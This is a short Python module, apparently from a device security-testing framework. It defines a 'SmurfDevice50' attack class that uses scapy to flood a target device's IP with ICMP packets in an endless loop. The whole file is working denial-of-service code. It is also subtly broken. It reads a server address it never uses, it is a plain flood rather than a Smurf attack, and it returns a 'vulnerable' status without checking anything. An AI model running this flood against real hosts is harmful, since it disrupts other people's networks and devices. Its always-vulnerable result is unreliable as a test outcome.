
from generic_attack import *
import logging
log = logging.getLogger(__name__)
from scapy.all import *

class SmurfDevice50(GenericAttack):

    def __init__(self, attackName, attackConfig, deviceConfig):
        super(SmurfDevice50, self).__init__(attackName, attackConfig, deviceConfig)

    def initialize(self, result):

        self.running = True
        target = self.device['ip']

        server_ip = self.config['server_ip']

        ip_hdr = IP(dst=target)
        icmpPacket = ip_hdr / ICMP()

        while self.running:
            send(icmpPacket)
            time.sleep(0.02)

        return result.update({"status": "vulnerable"})


    def shutdown(self):
        self.running = False


